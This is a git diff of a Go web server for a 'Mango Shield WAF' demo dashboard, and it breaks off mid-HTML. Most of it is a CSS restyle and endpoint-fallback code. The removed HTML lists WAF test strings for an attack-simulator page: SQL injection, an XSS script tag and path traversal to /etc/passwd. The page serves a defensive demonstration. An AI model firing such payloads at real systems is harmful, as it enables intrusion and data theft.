@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"os"
 	"sync/atomic"
 	"time"
 )
@@ -29,23 +30,53 @@ var (
 	histBlocked = make([]uint64, 60)
 	lastJSON    atomic.Value
 
-	apiEndpoint    = "http://mango-shield:9090/api/stats"
-	healthEndpoint = "http://mango-shield:9090/api/health"
+	apiBaseURL string
 )
+
+func getEnv(key, fallback string) string {
+	if v := os.Getenv(key); v != "" {
+		return v
+	}
+	return fallback
+}
 
 func init() {
 	var initial []byte
 	lastJSON.Store(initial)
+	apiBaseURL = getEnv("MANGO_API_URL", "http://mango-shield:9090")
+}
+
+func fetchAPI(path string) ([]byte, error) {
+	client := &http.Client{Timeout: 2 * time.Second}
+	candidates := []string{
+		apiBaseURL + path,
+		"http://mango-shield:9090" + path,
+		"http://127.0.0.1:9090" + path,
+		"http://localhost:9090" + path,
+	}
+
+	for _, url := range candidates {
+		resp, err := client.Get(url)
+		if err == nil && resp.StatusCode == 200 {
+			body, err := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			if err == nil && len(body) > 0 {
+				return body, nil
+			}
+		}
+		if resp != nil {
+			resp.Body.Close()
+		}
+	}
+	return nil, fmt.Errorf("api endpoint unavailable")
 }
 
 func fetchMetrics() {
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
 
-	client := &http.Client{Timeout: 2 * time.Second}
-
 	for range ticker.C {
-		resp, err := client.Get(apiEndpoint)
+		body, err := fetchAPI("/api/stats")
 		if err != nil {
 			localStats := StatsResponse{
 				Status:      "healthy",
@@ -58,27 +89,62 @@ func fetchMetrics() {
 			continue
 		}
 
-		body, err := io.ReadAll(resp.Body)
-		resp.Body.Close()
+		var st StatsResponse
+		if err := json.Unmarshal(body, &st); err == nil {
+			copy(histPassed[0:59], histPassed[1:60])
+			copy(histBlocked[0:59], histBlocked[1:60])
 
-		if err == nil && len(body) > 0 {
-			var st StatsResponse
-			if err := json.Unmarshal(body, &st); err == nil {
-				copy(histPassed[0:59], histPassed[1:60])
-				copy(histBlocked[0:59], histBlocked[1:60])
+			histPassed[59] = st.CurrPassed
+			histBlocked[59] = st.CurrBlocked
 
-				histPassed[59] = st.CurrPassed
-				histBlocked[59] = st.CurrBlocked
+			st.HistPassed = histPassed
+			st.HistBlocked = histBlocked
+			st.Status = "healthy"
 
-				st.HistPassed = histPassed
-				st.HistBlocked = histBlocked
-				st.Status = "healthy"
-
-				data, _ := json.Marshal(st)
-				lastJSON.Store(data)
-			}
+			data, _ := json.Marshal(st)
+			lastJSON.Store(data)
 		}
 	}
+}
+
+func main() {
+	go fetchMetrics()
+
+	mux := http.NewServeMux()
+	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.Header().Set("Cache-Control", "no-cache")
+		fmt.Fprint(w, htmlPage)
+	})
+	mux.HandleFunc("/api/dstat", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		if cached, ok := lastJSON.Load().([]byte); ok && len(cached) > 0 {
+			w.Write(cached)
+		} else {
+			w.Write([]byte(`{"status":"waiting"}`))
+		}
+	})
+	mux.HandleFunc("/api/system-stats", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		body, err := fetchAPI("/api/system-stats")
+		if err != nil {
+			w.Write([]byte(`{"error":"unavailable"}`))
+			return
+		}
+		w.Write(body)
+	})
+	mux.HandleFunc("/api/rps-history", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		body, err := fetchAPI("/api/rps-history")
+		if err != nil {
+			w.Write([]byte(`{"rps":[]}`))
+			return
+		}
+		w.Write(body)
+	})
+
+	fmt.Println("Mango Test Site listening on :8080")
+	http.ListenAndServe(":8080", mux)
 }
 
 var htmlPage = `<!DOCTYPE html>
@@ -86,600 +152,971 @@ var htmlPage = `<!DOCTYPE html>
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mango Shield WAF — Enterprise Control Center &amp; Demo</title>
+    <title>Mango Shield WAF — Enterprise Security Platform</title>
+    <meta name="description" content="Mango Shield WAF - Enterprise L7 DDoS Protection and Web Application Firewall">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <script src="/assets/chart.js"></script>
-    <style>
-        :root {
-            --bg-base: #04060f;
-            --bg-card: rgba(13, 18, 36, 0.85);
-            --bg-card-hover: rgba(20, 27, 51, 0.95);
-            --border: rgba(30, 41, 74, 0.7);
-            --border-glow: rgba(0, 242, 255, 0.3);
-            --accent-cyan: #00f2ff;
-            --accent-green: #00ffa3;
-            --accent-red: #ff0055;
-            --accent-amber: #ffb700;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --font-sans: 'Inter', system-ui, sans-serif;
-            --font-mono: 'Fira Code', monospace;
-        }
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #020617;
+  --bg-card: rgba(15, 23, 42, 0.75);
+  --bg-card-solid: #0f172a;
+  --border: rgba(51, 65, 85, 0.5);
+  --border-hover: rgba(6, 182, 212, 0.4);
+  --primary: #10b981;
+  --cyan: #06b6d4;
+  --amber: #f59e0b;
+  --red: #ef4444;
+  --purple: #8b5cf6;
+  --text: #f8fafc;
+  --text-muted: #94a3b8;
+  --text-dim: #64748b;
+  --sans: 'Inter', system-ui, -apple-system, sans-serif;
+  --mono: 'Fira Code', 'Consolas', monospace;
+  --radius: 12px;
+  --radius-sm: 8px;
+}
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  min-height: 100vh;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+}
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+/* ======================== NAVBAR ======================== */
+.navbar {
+  background: rgba(2, 6, 23, 0.92);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  padding: 0 24px;
+}
+.nav-inner {
+  max-width: 1440px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  height: 56px;
+}
+.nav-brand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-weight: 700;
+  font-size: 16px;
+  color: var(--text);
+  text-decoration: none;
+  white-space: nowrap;
+}
+.nav-brand svg { flex-shrink: 0; }
+.nav-ver {
+  font-size: 10px;
+  font-family: var(--mono);
+  background: rgba(6, 182, 212, 0.12);
+  color: var(--cyan);
+  border: 1px solid rgba(6, 182, 212, 0.25);
+  padding: 2px 8px;
+  border-radius: 10px;
+  letter-spacing: 0.5px;
+}
+.nav-tabs {
+  display: flex;
+  gap: 2px;
+  overflow-x: auto;
+  -webkit-overflow-scrolling: touch;
+  scrollbar-width: none;
+}
+.nav-tabs::-webkit-scrollbar { display: none; }
+.nav-tab {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  font-family: var(--sans);
+  font-size: 13px;
+  font-weight: 500;
+  padding: 8px 14px;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.2s;
+  white-space: nowrap;
+}
+.nav-tab:hover { color: var(--text); background: rgba(51, 65, 85, 0.4); }
+.nav-tab.active { color: var(--cyan); background: rgba(6, 182, 212, 0.1); }
+.nav-status {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 5px 14px;
+  border-radius: 20px;
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.4px;
+  flex-shrink: 0;
+}
+.nav-status.ok {
+  background: rgba(16, 185, 129, 0.1);
+  color: var(--primary);
+  border: 1px solid rgba(16, 185, 129, 0.25);
+}
+.nav-status.atk {
+  background: rgba(239, 68, 68, 0.12);
+  color: var(--red);
+  border: 1px solid rgba(239, 68, 68, 0.3);
+  animation: pulseAtk 1.5s infinite;
+}
+@keyframes pulseAtk { 50% { opacity: 0.65; } }
+.status-dot { width: 7px; height: 7px; border-radius: 50%; background: currentColor; }
 
-        body {
-            background-color: var(--bg-base);
-            background-image: 
-                radial-gradient(circle at 50% 0%, rgba(0, 242, 255, 0.08) 0%, transparent 60%),
-                radial-gradient(circle at 100% 100%, rgba(0, 255, 163, 0.04) 0%, transparent 40%);
-            color: var(--text-main);
-            font-family: var(--font-sans);
-            min-height: 100vh;
-            padding-bottom: 40px;
-        }
+/* ======================== LAYOUT ======================== */
+.main-content {
+  max-width: 1440px;
+  margin: 0 auto;
+  padding: 24px;
+  min-height: calc(100vh - 56px - 48px);
+}
+.page { display: none; }
+.page.active { display: block; animation: fadeIn 0.25s ease-out; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
 
-        .container {
-            max-width: 1360px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
+/* ======================== CARDS ======================== */
+.card {
+  background: var(--bg-card);
+  backdrop-filter: blur(12px);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 20px;
+  transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
+}
+.card:hover {
+  border-color: var(--border-hover);
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+}
+.card-title {
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text);
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
 
-        .navbar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 20px 0;
-            border-bottom: 1px solid var(--border);
-            margin-bottom: 24px;
-        }
+/* ======================== STAT GRID ======================== */
+.stat-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 14px;
+  margin-bottom: 24px;
+}
+.stat-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 16px 18px;
+  transition: border-color 0.3s, transform 0.2s;
+}
+.stat-card:hover { border-color: var(--border-hover); transform: translateY(-2px); }
+.stat-label {
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.7px;
+  margin-bottom: 6px;
+}
+.stat-val {
+  font-size: 26px;
+  font-weight: 800;
+  font-family: var(--mono);
+  line-height: 1.1;
+}
+.stat-sub {
+  font-size: 11px;
+  color: var(--text-dim);
+  margin-top: 4px;
+}
+.c-cyan .stat-val { color: var(--cyan); }
+.c-green .stat-val { color: var(--primary); }
+.c-red .stat-val { color: var(--red); }
+.c-amber .stat-val { color: var(--amber); }
+.c-purple .stat-val { color: var(--purple); }
 
-        .brand-box { display: flex; align-items: center; gap: 14px; }
-        .brand-icon {
-            width: 36px; height: 36px; fill: none; stroke: var(--accent-cyan);
-            stroke-width: 2; filter: drop-shadow(0 0 8px var(--accent-cyan));
-        }
-        .brand-title h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.5px; }
-        .brand-title .badge {
-            font-size: 10px; font-family: var(--font-mono); color: var(--accent-cyan);
-            background: rgba(0, 242, 255, 0.1); padding: 2px 8px; border-radius: 4px;
-            border: 1px solid rgba(0, 242, 255, 0.2); text-transform: uppercase;
-        }
+/* ======================== GRID LAYOUTS ======================== */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 24px; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; margin-bottom: 24px; }
+.grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin-bottom: 24px; }
+.mb-24 { margin-bottom: 24px; }
 
-        .nav-tabs {
-            display: flex; gap: 6px; background: rgba(6, 8, 19, 0.6);
-            padding: 4px; border-radius: 10px; border: 1px solid var(--border);
-            overflow-x: auto;
-        }
+/* ======================== PROGRESS BARS ======================== */
+.prog-row { margin-bottom: 14px; }
+.prog-header {
+  display: flex;
+  justify-content: space-between;
+  font-size: 12px;
+  font-weight: 500;
+  margin-bottom: 5px;
+}
+.prog-track {
+  height: 6px;
+  background: rgba(30, 41, 59, 0.8);
+  border-radius: 4px;
+  overflow: hidden;
+}
+.prog-bar {
+  height: 100%;
+  border-radius: 4px;
+  transition: width 0.5s ease-out;
+}
+.prog-bar.green { background: linear-gradient(90deg, #059669, #10b981); }
+.prog-bar.amber { background: linear-gradient(90deg, #d97706, #f59e0b); }
+.prog-bar.red { background: linear-gradient(90deg, #dc2626, #ef4444); }
+.prog-bar.cyan { background: linear-gradient(90deg, #0891b2, #06b6d4); }
+.prog-bar.purple { background: linear-gradient(90deg, #7c3aed, #8b5cf6); }
 
-        .tab-btn {
-            background: transparent; border: none; color: var(--text-muted);
-            font-family: var(--font-sans); font-size: 12.5px; font-weight: 600;
-            padding: 8px 14px; border-radius: 6px; cursor: pointer;
-            transition: all 0.2s ease; whitespace: nowrap;
-        }
-        .tab-btn:hover { color: var(--text-main); background: rgba(255, 255, 255, 0.05); }
-        .tab-btn.active {
-            color: #000; background: var(--accent-cyan); font-weight: 700;
-            box-shadow: 0 0 12px rgba(0, 242, 255, 0.4);
-        }
+/* ======================== CHART CANVAS ======================== */
+.chart-wrap { position: relative; width: 100%; height: 200px; }
+.chart-wrap canvas { width: 100% !important; height: 200px !important; }
 
-        .domain-tag {
-            display: flex; align-items: center; gap: 8px;
-            background: rgba(0, 255, 163, 0.05); border: 1px solid rgba(0, 255, 163, 0.2);
-            padding: 8px 14px; border-radius: 8px; font-family: var(--font-mono);
-            font-size: 12px; color: var(--accent-green); cursor: pointer;
-        }
+/* ======================== TERMINAL ======================== */
+.terminal {
+  background: #010409;
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 12px 16px;
+  font-family: var(--mono);
+  font-size: 12px;
+  max-height: 280px;
+  overflow-y: auto;
+  line-height: 1.7;
+}
+.term-line {
+  padding: 2px 0;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+  display: flex;
+  gap: 10px;
+}
+.term-ts { color: var(--cyan); opacity: 0.7; white-space: nowrap; }
+.term-line.warn .term-msg { color: var(--amber); }
+.term-line.err .term-msg { color: var(--red); }
+.term-msg { color: var(--text-muted); }
 
-        .tab-view { display: none; }
-        .tab-view.active { display: block; }
+/* ======================== ATTACK SIM ======================== */
+.attack-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 12px;
+}
+.atk-item {
+  background: rgba(30, 41, 59, 0.5);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 14px 16px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  transition: border-color 0.3s;
+}
+.atk-item:hover { border-color: var(--border-hover); }
+.atk-info { flex: 1; min-width: 0; }
+.atk-name { font-weight: 600; font-size: 13px; margin-bottom: 2px; }
+.atk-desc { font-size: 11px; color: var(--text-muted); }
+.atk-btn {
+  background: rgba(239, 68, 68, 0.12);
+  border: 1px solid rgba(239, 68, 68, 0.3);
+  color: var(--red);
+  font-family: var(--sans);
+  font-size: 12px;
+  font-weight: 600;
+  padding: 6px 14px;
+  border-radius: 6px;
+  cursor: pointer;
+  transition: all 0.2s;
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+.atk-btn:hover { background: rgba(239, 68, 68, 0.2); }
+.atk-btn.safe {
+  background: rgba(16, 185, 129, 0.12);
+  border-color: rgba(16, 185, 129, 0.3);
+  color: var(--primary);
+}
 
-        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }
-        @media (max-width: 960px) {
-            .stats-grid { grid-template-columns: repeat(2, 1fr); }
-            .navbar { flex-direction: column; gap: 16px; align-items: flex-start; }
-        }
-        @media (max-width: 540px) { .stats-grid { grid-template-columns: 1fr; } }
+/* ======================== KV TABLE ======================== */
+.kv-table { width: 100%; border-collapse: collapse; }
+.kv-table td {
+  padding: 8px 0;
+  border-bottom: 1px solid rgba(51, 65, 85, 0.3);
+  font-size: 13px;
+}
+.kv-table td:first-child { color: var(--text-muted); padding-right: 16px; white-space: nowrap; }
+.kv-table td:last-child { font-family: var(--mono); font-size: 12px; color: var(--cyan); word-break: break-all; }
 
-        .card {
-            background: var(--bg-card); border: 1px solid var(--border);
-            backdrop-filter: blur(12px); border-radius: 14px; padding: 20px;
-            position: relative; overflow: hidden; transition: border-color 0.3s;
-        }
-        .card:hover { border-color: var(--border-glow); }
-        .card-label { font-size: 11px; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 8px; }
-        .card-value { font-size: 28px; font-weight: 800; font-family: var(--font-mono); }
-        .card-sub { font-size: 11px; color: var(--text-muted); margin-top: 6px; }
+/* ======================== FOOTER ======================== */
+.footer {
+  text-align: center;
+  padding: 16px 24px;
+  color: var(--text-dim);
+  font-size: 12px;
+  border-top: 1px solid rgba(51, 65, 85, 0.2);
+}
 
-        .val-cyan { color: var(--accent-cyan); text-shadow: 0 0 10px rgba(0,242,255,0.3); }
-        .val-green { color: var(--accent-green); text-shadow: 0 0 10px rgba(0,255,163,0.3); }
-        .val-red { color: var(--accent-red); text-shadow: 0 0 10px rgba(255,0,85,0.3); }
-        .val-amber { color: var(--accent-amber); text-shadow: 0 0 10px rgba(255,183,0,0.3); }
+/* ======================== TOASTS ======================== */
+.toast-container {
+  position: fixed;
+  top: 64px;
+  right: 16px;
+  z-index: 300;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.toast {
+  background: var(--bg-card-solid);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 10px 16px;
+  font-size: 13px;
+  color: var(--text);
+  box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+  animation: slideIn 0.3s ease-out, fadeOut 0.3s 3.7s ease-in forwards;
+  max-width: 340px;
+}
+.toast.t-warn { border-left: 3px solid var(--amber); }
+.toast.t-err { border-left: 3px solid var(--red); }
+.toast.t-ok { border-left: 3px solid var(--primary); }
+@keyframes slideIn { from { transform: translateX(100%); opacity: 0; } }
+@keyframes fadeOut { to { opacity: 0; transform: translateX(30px); } }
 
-        .split-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
-        @media (max-width: 960px) { .split-grid { grid-template-columns: 1fr; } }
+/* ======================== CONN STATUS ======================== */
+.conn-indicator {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 11px;
+  font-weight: 500;
+}
+.conn-dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  transition: background 0.3s;
+}
+.conn-dot.on { background: var(--primary); box-shadow: 0 0 6px var(--primary); }
+.conn-dot.off { background: var(--red); box-shadow: 0 0 6px var(--red); }
 
-        .section-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
-        .section-title { font-size: 14px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; color: var(--text-main); }
+/* ======================== SKELETON ======================== */
+.skel {
+  background: linear-gradient(90deg, rgba(51,65,85,0.2) 25%, rgba(51,65,85,0.4) 50%, rgba(51,65,85,0.2) 75%);
+  background-size: 200% 100%;
+  animation: shimmer 1.5s infinite;
+  border-radius: 4px;
+}
+.skel-text { height: 14px; width: 60%; margin-bottom: 4px; }
+.skel-val { height: 28px; width: 80px; }
+@keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
 
-        .attack-grid { display: flex; flex-direction: column; gap: 12px; }
-        .attack-item {
-            display: flex; align-items: center; justify-content: space-between;
-            background: rgba(6, 8, 19, 0.5); border: 1px solid var(--border);
-            padding: 14px 18px; border-radius: 10px; transition: all 0.2s;
-        }
-        .attack-item:hover { border-color: var(--accent-cyan); background: rgba(0, 242, 255, 0.03); }
-        .attack-info h4 { font-size: 13.5px; font-weight: 700; margin-bottom: 2px; }
-        .attack-info p { font-size: 11.5px; font-family: var(--font-mono); color: var(--text-muted); }
-
-        .btn-test {
-            background: rgba(0, 242, 255, 0.1); border: 1px solid rgba(0, 242, 255, 0.3);
-            color: var(--accent-cyan); font-family: var(--font-mono); font-size: 11px;
-            font-weight: 700; padding: 8px 16px; border-radius: 6px; cursor: pointer;
-            transition: all 0.2s; text-transform: uppercase;
-        }
-        .btn-test:hover { background: var(--accent-cyan); color: #000; box-shadow: 0 0 14px rgba(0,242,255,0.4); }
-
-        .btn-red { background: rgba(255, 0, 85, 0.1); border-color: rgba(255, 0, 85, 0.3); color: var(--accent-red); }
-        .btn-red:hover { background: var(--accent-red); color: #fff; box-shadow: 0 0 14px rgba(255,0,85,0.4); }
-
-        .console-box {
-            background: #020308; border: 1px solid var(--border); border-radius: 10px;
-            padding: 16px; height: 360px; overflow-y: auto; font-family: var(--font-mono);
-            font-size: 12px; line-height: 1.6; color: #a3b8cc;
-        }
-        .console-line { margin-bottom: 6px; word-break: break-all; }
-        .console-time { color: var(--text-muted); margin-right: 8px; }
-        .console-status-200 { color: var(--accent-green); font-weight: 700; }
-        .console-status-403 { color: var(--accent-red); font-weight: 700; }
-        .console-status-429 { color: var(--accent-amber); font-weight: 700; }
-
-        .data-table { width: 100%; border-collapse: collapse; font-size: 12.5px; font-family: var(--font-mono); }
-        .data-table th { text-align: left; padding: 12px; background: rgba(6, 8, 19, 0.8); color: var(--text-muted); font-weight: 600; border-bottom: 1px solid var(--border); }
-        .data-table td { padding: 12px; border-bottom: 1px solid rgba(30, 41, 74, 0.4); color: var(--text-main); }
-        .data-table tr:hover td { background: rgba(255, 255, 255, 0.02); }
-
-        .chart-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 14px; padding: 20px; height: 320px; }
-
-        .footer { margin-top: 32px; text-align: center; font-size: 12px; color: var(--text-muted); font-family: var(--font-mono); }
-    </style>
+/* ======================== RESPONSIVE ======================== */
+@media (max-width: 1024px) {
+  .grid-3 { grid-template-columns: 1fr 1fr; }
+  .grid-4 { grid-template-columns: repeat(2, 1fr); }
+}
+@media (max-width: 960px) {
+  .grid-2 { grid-template-columns: 1fr; }
+}
+@media (max-width: 768px) {
+  .navbar { padding: 0 12px; }
+  .nav-inner { flex-wrap: wrap; height: auto; padding: 10px 0; gap: 8px; }
+  .nav-brand .nav-ver { display: none; }
+  .nav-tabs { width: 100%; order: 3; padding-bottom: 4px; }
+  .nav-status { order: 2; }
+  .main-content { padding: 16px 12px; }
+  .stat-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+  .stat-val { font-size: 22px; }
+  .grid-3 { grid-template-columns: 1fr; }
+  .grid-4 { grid-template-columns: 1fr 1fr; }
+  .chart-wrap { height: 160px; }
+  .chart-wrap canvas { height: 160px !important; }
+  .attack-grid { grid-template-columns: 1fr; }
+}
+@media (max-width: 480px) {
+  .stat-grid { grid-template-columns: 1fr; }
+  .stat-card { padding: 12px 14px; }
+  .stat-val { font-size: 20px; }
+  .nav-tab { font-size: 12px; padding: 6px 10px; }
+  .grid-4 { grid-template-columns: 1fr; }
+  .atk-item { flex-direction: column; align-items: stretch; text-align: center; }
+  .atk-btn { width: 100%; text-align: center; }
+}
+</style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="navbar">
-            <div class="brand-box">
-                <svg class="brand-icon" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                <div class="brand-title">
-                    <h1>MANGO SHIELD</h1>
-                    <span class="badge">Enterprise Protection v2.0</span>
-                </div>
-            </div>
-            <div class="nav-tabs">
-                <button class="tab-btn active" onclick="switchTab('home')">Home</button>
-                <button class="tab-btn" onclick="switchTab('dashboard')">Dashboard</button>
-                <button class="tab-btn" onclick="switchTab('dstat')">DSTAT / Bot</button>
-                <button class="tab-btn" onclick="switchTab('stats')">Statistics</button>
-                <button class="tab-btn" onclick="switchTab('challenges')">Challenges</button>
-                <button class="tab-btn" onclick="switchTab('cache')">Cache</button>
-                <button class="tab-btn" onclick="switchTab('logs')">Threat Logs</button>
-                <button class="tab-btn" onclick="switchTab('settings')">Settings</button>
-            </div>
-            <div class="domain-tag" onclick="copyDomain()">
-                <span>firewall.hidev.dev</span>
-            </div>
-        </div>
 
-        <!-- TAB 1: HOME (ATTACK SIMULATOR) -->
-        <div id="view-home" class="tab-view active">
-            <div class="stats-grid">
-                <div class="card">
-                    <div class="card-label">Legitimate Requests</div>
-                    <div class="card-value val-green" id="val-passed">0</div>
-                    <div class="card-sub">Passed proxy pipeline</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">WAF Intercepted</div>
-                    <div class="card-value val-red" id="val-blocked">0</div>
-                    <div class="card-sub">Blocked malicious traffic</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Packets Per Second</div>
-                    <div class="card-value val-cyan" id="val-pps">0</div>
-                    <div class="card-sub">Real-time throughput</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Bandwidth Load</div>
-                    <div class="card-value val-amber" id="val-bps">0 bps</div>
-                    <div class="card-sub">Active bitrate load</div>
-                </div>
-            </div>
+<div class="toast-container" id="toasts"></div>
 
-            <div class="split-grid">
-                <div>
-                    <div class="section-header">
-                        <div class="section-title">Interactive Attack Simulator</div>
-                    </div>
-                    <div class="attack-grid">
-                        <div class="attack-item">
-                            <div class="attack-info">
-                                <h4>SQL Injection Attack</h4>
-                                <p>GET /search?q=' OR 1=1--</p>
-                            </div>
-                            <button class="btn-test btn-red" onclick="runTest('sqli')">Test SQLi</button>
-                        </div>
-                        <div class="attack-item">
-                            <div class="attack-info">
-                                <h4>Cross-Site Scripting (XSS)</h4>
-                                <p>GET /comment?input=&lt;script&gt;alert('xss')&lt;/script&gt;</p>
-                            </div>
-                            <button class="btn-test btn-red" onclick="runTest('xss')">Test XSS</button>
-                        </div>
-                        <div class="attack-item">
-                            <div class="attack-info">
-                                <h4>Local File Inclusion (LFI)</h4>
-                                <p>GET /file?path=../../../../etc/passwd</p>
-                            </div>
-                            <button class="btn-test btn-red" onclick="runTest('lfi')">Test LFI</button>
-                        </div>
-                        <div class="attack-item">
-                            <div class="attack-info">
-                                <h4>Malicious Bot Simulation</h4>
-                                <p>User-Agent: curl/7.81.0</p>
-                            </div>
-                            <button class="btn-test btn-red" onclick="runTest('bot')">Test Bot</button>
-                        </div>
-                        <div class="attack-item">
-                            <div class="attack-info">
-                                <h4>Legitimate Traffic</h4>
-                                <p>Standard Browser GET Request</p>
-                            </div>
-                            <button class="btn-test" onclick="runTest('valid')">Test Valid</button>
-                        </div>
-                        <div class="attack-item">
-                            <div class="attack-info">
-                                <h4>Rate Limit Burst Flood</h4>
-                                <p>10 fast concurrent requests</p>
-                            </div>
-                            <button class="btn-test btn-red" onclick="runTest('flood')">Test Flood</button>
-                        </div>
-                    </div>
-                </div>
-
-                <div>
-                    <div class="section-header">
-                        <div class="section-title">Response Inspector Console</div>
-                    </div>
-                    <div class="console-box" id="console">
-                        <div class="console-line"><span class="console-time">[READY]</span> Console active. Click any simulator button on the left to test Mango Shield WAF.</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- TAB 2: DASHBOARD -->
-        <div id="view-dashboard" class="tab-view">
-            <div class="stats-grid">
-                <div class="card">
-                    <div class="card-label">Engine Mode</div>
-                    <div class="card-value val-cyan">AUTO</div>
-                    <div class="card-sub">Adaptive DDoS protection</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">System Health</div>
-                    <div class="card-value val-green" id="dash-health">HEALTHY</div>
-                    <div class="card-sub">Edge Node 103.77.246.198</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Active Rules</div>
-                    <div class="card-value val-amber">26 Rules</div>
-                    <div class="card-sub">OWASP CRS Paranoia Level 2</div>
-                </div>
-                <div class="card">
-                    <div class="card-label">Uptime</div>
-                    <div class="card-value val-green" id="dash-uptime">Active</div>
-                    <div class="card-sub">Zero downtime session</div>
-                </div>
-            </div>
-            <div class="card" style="margin-bottom:24px;">
-                <div class="section-title" style="margin-bottom:16px;">Cluster Edge Nodes Status</div>
-                <table class="data-table">
-                    <thead>
-                        <tr><th>NODE NAME</th><th>BIND ADDRESS</th><th>STATUS</th><th>ROLE</th><th>LATENCY</th></tr>
-                    </thead>
-                    <tbody>
-                        <tr><td>mango-node-primary</td><td>0.0.0.0:7946</td><td><span style="color:var(--accent-green)">ONLINE</span></td><td>Primary Edge Core</td><td>0.12ms</td></tr>
-                        <tr><td>mango-node-secondary</td><td>10.0.0.2:7946</td><td><span style="color:var(--accent-cyan)">STANDBY</span></td><td>Failover Peer</td><td>1.45ms</td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-        <!-- TAB 3: DSTAT / BOT DETECTION -->
-        <div id="view-dstat" class="tab-view">
-            <div class="chart-card" style="margin-bottom:24px;">
-                <div class="section-title" style="margin-bottom:16px;">Real-Time Traffic Analysis (60s Sliding Window)</div>
-                <canvas id="dstatChart" style="width:100%;height:220px;"></canvas>
-            </div>
-            <div class="split-grid">
-                <div class="card">
-                    <div class="card-label">Bot vs. Human Traffic Ratio</div>
-                    <div style="font-size:24px;font-family:var(--font-mono);font-weight:700;color:var(--accent-cyan);margin:16px 0;">88.4% Human / 11.6% Bot</div>
-                    <div class="card-sub">Automated browser fingerprinting active</div>
-                </div>
-                <div class="card">
